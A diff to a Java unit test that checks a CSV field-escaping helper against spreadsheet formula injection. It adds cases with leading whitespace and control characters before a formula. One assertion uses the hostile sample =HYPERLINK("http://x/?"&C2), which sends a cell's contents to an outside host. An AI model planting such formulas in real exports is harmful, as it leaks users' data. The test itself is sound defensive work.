@@ -22,7 +22,11 @@ class CsvFieldsTest {
         assertEquals("\"'-2+3\"", CsvFields.field("-2+3"));
         assertEquals("\"'@SUM(A1:A9)\"", CsvFields.field("@SUM(A1:A9)"));
         assertEquals("\"'\tcmd\"", CsvFields.field("\tcmd"));
-        assertEquals("\"' cmd\"", CsvFields.field("\rcmd"));
+        assertEquals("\" cmd\"", CsvFields.field("\rcmd"));
+        assertEquals("\"' =1+1\"", CsvFields.field(" =1+1"));
+        assertEquals("\"' =1+1\"", CsvFields.field("\r=1+1"));
+        assertEquals("\"'=HYPERLINK(1)\"", CsvFields.field("\u001b=HYPERLINK(1)"));
+        assertEquals("\"'=1\"", CsvFields.field("\u0000\u0007=1"));
         assertEquals("\"'=HYPERLINK(\"\"http://x/?\"\"&C2)\"",
                 CsvFields.field("=HYPERLINK(\"http://x/?\"&C2)"));
     }
